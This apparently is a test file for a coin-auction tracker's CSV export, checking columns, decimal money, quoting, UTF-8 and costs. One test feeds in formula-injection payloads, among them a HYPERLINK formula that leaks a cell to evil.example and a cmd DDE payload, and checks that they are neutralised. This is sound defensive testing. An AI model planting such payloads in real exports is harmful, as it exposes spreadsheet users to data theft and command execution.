import test from 'node:test';
import assert from 'node:assert/strict';

import { CSV_TABLES, csvCell, csvFiles, decimalAmount } from '../extension/core/csv.js';
import { createEmptySnapshot } from '../extension/core/records.js';

const NOW = '2026-09-12T12:00:00.000Z';
const uuid = (index) => `00000000-0000-4000-8000-${String(index).padStart(12, '0')}`;

function lot(id, extra = {}) {
  return {
    id, revision: 0, dataClass: 'collector', title: 'Coin', sourceLinks: [], bidHistory: [],
    outcome: { status: 'open' }, outcomeHistory: [], createdAt: NOW, updatedAt: NOW, ...extra,
  };
}

// RFC 4180 as a spreadsheet reads it: fields split on commas outside quotes, records on CRLF outside quotes.
function parseCsv(text) {
  const rows = [];
  let row = [];
  let field = '';
  let quoted = false;
  for (let index = 0; index < text.length; index += 1) {
    const char = text[index];
    if (quoted) {
      if (char === '"' && text[index + 1] === '"') { field += '"'; index += 1; }
      else if (char === '"') quoted = false;
      else field += char;
    } else if (char === '"') quoted = true;
    else if (char === ',') { row.push(field); field = ''; }
    else if (char === '\r' && text[index + 1] === '\n') { row.push(field); rows.push(row); row = []; field = ''; index += 1; }
    else field += char;
  }
  if (field || row.length) { row.push(field); rows.push(row); }
  return rows;
}

function table(text) {
  assert.equal(text[0], '﻿', 'every file opens with a byte order mark so Excel reads it as UTF-8');
  const [header, ...rows] = parseCsv(text.slice(1));
  return rows.map((row) => Object.fromEntries(header.map((name, index) => [name, row[index]])));
}

function fullSnapshot() {
  const snapshot = createEmptySnapshot(NOW);
  snapshot.auctionEvents.push({
    id: uuid(90), revision: 0, dataClass: 'collector', name: 'Roma E-Sale 120', eventKind: 'lot-closes',
    precision: 'timed', localDate: '2026-10-02', localTime: '15:00', timeZone: 'Europe/London',
    startsAt: '2026-10-02T14:00:00.000Z', reminderScope: 'linked-lots', reminders: [],
    createdAt: NOW, updatedAt: NOW,
  });
  snapshot.lots.push(
    lot(uuid(1), {
      title: 'Hadrian, denarius', reference: 'RIC II.3 1234', notes: 'Toned, from an old collection',
      auctionEventId: uuid(90),
      auctionContext: { pageUrl: 'https://example.com/lot/7', house: 'Roma Numismatics', saleId: 'E-Sale 120', lotNumber: '7' },
      plannedBid: { amount: { currency: 'GBP', minor: 25050 }, buyerPremiumBps: 2000 },
      bidHistory: [
        { id: uuid(11), action: 'planned-revised', amount: { currency: 'GBP', minor: 25050 }, buyerPremiumBps: 2000, recordedAt: '2026-09-10T08:00:00.000Z' },
      ],
    }),
    lot(uuid(2), {
      title: 'Athens, tetradrachm', lotNumber: '312',
      outcome: { status: 'won', hammer: { currency: 'CHF', minor: 120000 }, actualInvoice: { currency: 'CHF', minor: 147605 }, verification: 'personal-unverified' },
      outcomeHistory: [{ id: uuid(21), from: 'open', to: 'won', recordedAt: '2026-09-11T19:30:00.000Z' }],
      bidHistory: [
        { id: uuid(12), action: 'placed', amount: { currency: 'CHF', minor: 110000 }, recordedAt: '2026-09-09T10:00:00.000Z' },
        { id: uuid(13), action: 'settled-won', amount: { currency: 'CHF', minor: 110000 }, recordedAt: '2026-09-11T19:30:00.000Z' },
      ],
      collectionEntryId: uuid(31),
    }),
    lot(uuid(3), {
      title: 'Nero, sestertius',
      activeBid: { amount: { currency: 'USD', minor: 9900 }, placedAt: '2026-09-11T09:00:00.000Z' },
    }),
  );
  snapshot.collectionEntries.push({
    id: uuid(31), revision: 0, dataClass: 'collector', lotId: uuid(2), title: 'Athens, tetradrachm',
    acquisitionDate: '2026-09-11', sourceLinks: [], hammer: { currency: 'CHF', minor: 120000 },
    actualInvoice: { currency: 'CHF', minor: 147605 }, notes: 'Cabinet 2', createdAt: NOW, updatedAt: NOW,
  });
  return snapshot;
}

test('csvFiles names one file per table', () => {
  const files = csvFiles(fullSnapshot());
  assert.deepEqual(Object.keys(files), ['lots', 'collection', 'bids', 'outcomes']);
  assert.deepEqual(CSV_TABLES.map(({ key }) => key), Object.keys(files));
  for (const text of Object.values(files)) assert.equal(typeof text, 'string');
});

test('the lots table writes one row per lot with its auction, bids and outcome', () => {
  const rows = table(csvFiles(fullSnapshot()).lots);
  assert.equal(rows.length, 3);
  const [hadrian, athens, nero] = rows;
  assert.equal(hadrian.title, 'Hadrian, denarius');
  assert.equal(hadrian.reference, 'RIC II.3 1234');
  assert.equal(hadrian.auction_house, 'Roma Numismatics');
  assert.equal(hadrian.sale, 'E-Sale 120');
  assert.equal(hadrian.lot_number, '7');
  assert.equal(hadrian.auction, 'Roma E-Sale 120');
  assert.equal(hadrian.event_date, '2026-10-02');
  assert.equal(hadrian.event_starts_at, '2026-10-02T14:00:00.000Z');
  assert.equal(hadrian.status, 'Bid planned');
  assert.equal(hadrian.planned_bid, '250.50');
  assert.equal(hadrian.planned_bid_currency, 'GBP');
  assert.equal(hadrian.planned_premium_percent, '20.00');
  assert.equal(hadrian.placed_bid, '');
  assert.equal(hadrian.outcome, 'open');
  assert.equal(hadrian.notes, 'Toned, from an old collection');

  assert.equal(athens.lot_number, '312', 'a lot number saved on the lot itself is used when no auction context carries one');
  assert.equal(athens.status, 'Won');
  assert.equal(athens.outcome, 'won');
  assert.equal(athens.hammer, '1200.00');
  assert.equal(athens.hammer_currency, 'CHF');
  assert.equal(athens.invoice, '1476.05');
  assert.equal(athens.invoice_currency, 'CHF');
  assert.equal(athens.event_date, '');

  assert.equal(nero.status, 'Bid active');
  assert.equal(nero.placed_bid, '99.00');
  assert.equal(nero.placed_bid_currency, 'USD');
  assert.equal(nero.placed_at, '2026-09-11T09:00:00.000Z');
});

test('collection, bids and outcomes tables each write one row per record', () => {
  const files = csvFiles(fullSnapshot());
  const collection = table(files.collection);
  assert.equal(collection.length, 1);
  assert.equal(collection[0].title, 'Athens, tetradrachm');
  assert.equal(collection[0].acquisition_date, '2026-09-11');
  assert.equal(collection[0].hammer, '1200.00');
  assert.equal(collection[0].hammer_currency, 'CHF');
  assert.equal(collection[0].invoice, '1476.05');
  assert.equal(collection[0].lot_id, uuid(2));
  assert.equal(collection[0].notes, 'Cabinet 2');

  const bids = table(files.bids);
  assert.deepEqual(bids.map((row) => [row.lot_title, row.action, row.amount, row.currency, row.recorded_at]), [
    ['Hadrian, denarius', 'planned-revised', '250.50', 'GBP', '2026-09-10T08:00:00.000Z'],
    ['Athens, tetradrachm', 'placed', '1100.00', 'CHF', '2026-09-09T10:00:00.000Z'],
    ['Athens, tetradrachm', 'settled-won', '1100.00', 'CHF', '2026-09-11T19:30:00.000Z'],
  ]);
  assert.equal(bids[0].premium_percent, '20.00');
  assert.equal(bids[1].premium_percent, '');

  const outcomes = table(files.outcomes);
  assert.deepEqual(outcomes.map((row) => [row.lot_title, row.from, row.to, row.recorded_at]), [
    ['Athens, tetradrachm', 'open', 'won', '2026-09-11T19:30:00.000Z'],
  ]);
});

test('money is a plain decimal with its currency beside it, never formatted and never summed', () => {
  const files = csvFiles(fullSnapshot());
  for (const text of Object.values(files)) {
    // No currency symbol, no grouping separator, and no total across records: the one total is each won coin's own
    // cost, in its hammer's currency, in a column of its own.
    assert.doesNotMatch(text, /[$€£]|CHF\s?\d|\d,\d{3}/);
    assert.doesNotMatch(text.replace(/"total_cost(?:_currency|_missing)?"/g, ''), /total/i);
  }
  assert.equal(decimalAmount({ currency: 'USD', minor: 5 }), '0.05');
  assert.equal(decimalAmount({ currency: 'USD', minor: 0 }), '0.00');
  assert.equal(decimalAmount({ currency: 'EUR', minor: Number.MAX_SAFE_INTEGER }), '90071992547409.91');
  assert.equal(decimalAmount(undefined), '');
  assert.equal(decimalAmount({ currency: 'USD', minor: -1 }), '');
});

test('every field is quoted and records end in CRLF, so commas, quotes and newlines survive', () => {
  const snapshot = createEmptySnapshot(NOW);
  snapshot.lots.push(lot(uuid(1), { title: 'Coin, "rare"\nsecond line', notes: 'a,b\r\nc' }));
  const text = csvFiles(snapshot).lots;
  const lines = text.slice(1).split('\r\n');
  assert.ok(lines[0].split(',').every((field) => /^".*"$/.test(field)), 'header fields are quoted too');
  assert.ok(text.endsWith('\r\n'));
  const [row] = table(text);
  assert.equal(row.title, 'Coin, "rare"\nsecond line');
  assert.equal(row.notes, 'a,b\r\nc');
});

// A title copied from an auction page is untrusted: a spreadsheet must show it, never run it.
test('a cell that a spreadsheet would read as a formula is neutralised with a leading apostrophe', () => {
  const hostile = [
    '=HYPERLINK("https://evil.example/?"&A1,"Click")',
    '+SUM(1,2)',
    '-2+3',
    '@SUM(A1:A2)',
    '\t=1+1',
    '\r=1+1',
    // Whitespace ahead of the sign, and the full-width signs a spreadsheet may fold to the ASCII ones.
    ' =1+1',
    '\u00a0=1+1',
    '\uFEFF=1+1',
    '\n=1+1',
    '\uFF1D1+1',
    '\uFF0BSUM(1,2)',
    '\uFF0D2+3',
    '\uFF20SUM(A1:A2)',
  ];
  for (const title of hostile) {
    assert.equal(csvCell(title), `"'${title.replace(/"/g, '""')}"`, JSON.stringify(title));
  }
  const snapshot = createEmptySnapshot(NOW);
  snapshot.lots.push(...hostile.map((title, index) => lot(uuid(index + 1), { title, notes: title, reference: '=cmd|"/c calc"!A1' })));
  const rows = table(csvFiles(snapshot).lots);
  assert.deepEqual(rows.map((row) => row.title), hostile.map((title) => `'${title}`));
  assert.deepEqual(rows.map((row) => row.notes), hostile.map((title) => `'${title}`));
  assert.ok(rows.every((row) => row.reference === `'=cmd|"/c calc"!A1`));
  // A cell that opens with a tab or a carriage return is guarded whatever follows, as the brief lists them.
  assert.equal(csvCell('\tnote'), `"'\tnote"`);
  assert.equal(csvCell('\rnote'), `"'\rnote"`);
  // Harmless text is left exactly as it was.
  assert.equal(csvCell(' Hadrian'), '" Hadrian"');
  assert.equal(csvCell('Hadrian = good'), '"Hadrian = good"');
  assert.equal(csvCell('2026-09-12'), '"2026-09-12"');
  assert.equal(csvCell(''), '""');
  assert.equal(csvCell(undefined), '""');
});

test('accented text is written as UTF-8 text behind a byte order mark', () => {
  const snapshot = createEmptySnapshot(NOW);
  snapshot.lots.push(lot(uuid(1), { title: 'Séleucos Iᵉʳ Nikatôr, tétradrachme' }));
  const text = csvFiles(snapshot).lots;
  assert.equal(new TextEncoder().encode(text).slice(0, 3).join(','), '239,187,191');
  assert.equal(table(text)[0].title, 'Séleucos Iᵉʳ Nikatôr, tétradrachme');
});

test('an empty store still writes a header row for every table', () => {
  const files = csvFiles(createEmptySnapshot(NOW));
  for (const [key, text] of Object.entries(files)) {
    const [header, ...rows] = parseCsv(text.slice(1));
    assert.ok(header.length > 3, key);
    assert.equal(rows.length, 0, key);
  }
});

// N1: a won coin's real cost - hammer, premium, fees and their total in the hammer's currency - with the figures a
// cost could not be worked out without named instead of a guessed total.
test('the lots and collection tables carry each won coin’s worked-out cost, or what it is missing', () => {
  const snapshot = fullSnapshot();
  const chf = (minor) => ({ currency: 'CHF', minor });
  const athens = snapshot.lots[1];
  athens.outcome.cost = {
    buyerPremiumBps: 2000, premium: chf(24000), premiumVat: chf(1944), platformFee: chf(0), shipping: chf(1500), paymentFee: chf(161),
    total: chf(147605),
  };
  snapshot.lots.push(lot(uuid(4), {
    title: 'Trajan, aureus',
    outcome: { status: 'won', hammer: chf(500000), verification: 'personal-unverified', cost: { buyerPremiumBps: 2000, premium: chf(100000), missing: ['fees'] } },
  }));
  const lots = table(csvFiles(snapshot).lots);
  assert.deepEqual(['premium', 'fees', 'total_cost', 'total_cost_currency', 'total_cost_missing'].map((key) => lots[1][key]),
    ['240.00', '36.05', '1476.05', 'CHF', '']);
  assert.deepEqual(['premium', 'fees', 'total_cost', 'total_cost_currency', 'total_cost_missing'].map((key) => lots[3][key]),
    ['1000.00', '', '', '', 'fees']);
  assert.deepEqual(['premium', 'total_cost', 'total_cost_missing'].map((key) => lots[0][key]), ['', '', ''], 'an open lot has no cost');
  const [entry] = table(csvFiles(snapshot).collection);
  assert.deepEqual([entry.total_cost, entry.total_cost_currency, entry.total_cost_missing], ['1476.05', 'CHF', '']);
});

test('a coin won before costs were stored is costed from its own records, and says what it lacks', () => {
  const [, athens] = table(csvFiles(fullSnapshot()).lots);
  assert.equal(athens.total_cost, '');
  assert.equal(athens.total_cost_missing, 'premium-rate fees');
});

// Q-04: import VAT is its own column in the lots table, part of `fees`, and part of `total_cost`.
test('a won coin’s import VAT is its own column, and the total cost includes it', () => {
  const snapshot = fullSnapshot();
  const chf = (minor) => ({ currency: 'CHF', minor });
  snapshot.lots[1].outcome.cost = {
    buyerPremiumBps: 2000, premium: chf(24000), premiumVat: chf(0), platformFee: chf(0), shipping: chf(1500), paymentFee: chf(0),
    total: chf(145500), importVat: chf(7275),
  };
  const [, athens] = table(csvFiles(snapshot).lots);
  assert.deepEqual(['import_vat', 'fees', 'total_cost'].map((key) => athens[key]), ['72.75', '87.75', '1527.75']);
  const [entry] = table(csvFiles(snapshot).collection);
  assert.equal(entry.total_cost, '1527.75');
});
